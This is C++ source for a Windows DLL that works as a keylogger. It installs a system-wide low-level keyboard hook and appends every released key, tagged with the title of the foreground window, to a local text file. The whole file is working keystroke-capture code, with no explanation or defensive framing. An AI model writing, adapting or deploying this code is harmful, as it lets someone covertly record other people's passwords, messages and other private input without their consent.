#include <windows.h>
#include <fstream>


HINSTANCE hInstance = NULL;
HWND hLauncherWnd = NULL;
UINT uiKeyboardMessage = WM_NULL;
HHOOK hKeyboardHook = NULL;


static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION && hLauncherWnd && wParam == WM_KEYUP)
	{
		KBDLLHOOKSTRUCT * strct = (KBDLLHOOKSTRUCT *)lParam;
		DWORD wVirtKey = strct->vkCode, wScanCode = strct->scanCode;

		if (wVirtKey == VK_ESCAPE) PostQuitMessage(0);

		BYTE lpKeyState[256];
		GetKeyboardState(lpKeyState);
		CHAR result;
		ToAscii(wVirtKey, wScanCode, lpKeyState, (LPWORD)&result, 0);
		
		std::ofstream fout(TEXT("E:\\cppstudio.txt"), std::ios_base::out | std::ios_base::app);
		if (!fout.is_open())
		{
			return NULL;
		}

		CHAR wnd_title[256] = {0};
		HWND hwnd = GetForegroundWindow(); 
		GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
		
		fout << "[ " << wnd_title << " ] : " << result << '\n';
		fout.close();

	}
	return CallNextHookEx(0, nCode, wParam, lParam);

}

extern "C" __declspec(dllexport) BOOL CALLBACK SetKeyboardHook()
{
	if (!hKeyboardHook)
		hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hInstance, 0);
	return hKeyboardHook ? TRUE : FALSE;
}

extern "C" __declspec(dllexport) VOID CALLBACK UnhookKeyboardHook()
{
	if (hKeyboardHook)
		UnhookWindowsHookEx(hKeyboardHook);
	hKeyboardHook = NULL;
}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpvReserved)
{
	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		hInstance = hDLL;
		hLauncherWnd = FindWindow(TEXT("ClassName"), NULL);
		uiKeyboardMessage = RegisterWindowMessage(TEXT("KeyboardHook"));
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
